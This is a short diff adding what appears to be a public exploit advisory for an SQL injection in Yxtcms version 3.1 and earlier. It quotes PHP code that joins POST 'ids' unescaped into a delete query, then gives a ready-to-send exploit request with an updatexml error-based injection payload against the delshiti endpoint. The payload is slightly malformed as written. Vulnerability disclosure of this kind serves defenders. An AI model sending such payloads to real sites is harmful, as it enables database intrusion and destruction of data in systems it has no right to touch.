@@ -1,0 +1,24 @@
+# By Li ZaiTang
+
+'''
+For the incoming id intval escaped, but the POST incoming ids if passed into an array will automatically addslashes for 
+proofing,if the string is passed, it will lead to the existence of SQL injection vulnerability
+Source: 267-274行
+		if(isset($_POST['ids'])){
+			$tids=join(",",$_POST['ids']);
+			if ($this->shiti_obj->where("id in ($tids)")->delete()) {
+				$this->success("删除成功！");
+			} else {
+				$this->error("删除失败！");
+			}
+		}
+
+	Affected software:Yxtcms <=3.1
+	Software Link: http://down.admin5.com/php/133101.html
+
+'''
+
+exploit:
+127.0.0.1/index.php/exam/shiti/delshiti.html
+POST 
+ids[]=1)) or updatexml(1,concat()0x7e,(version())),0)%23
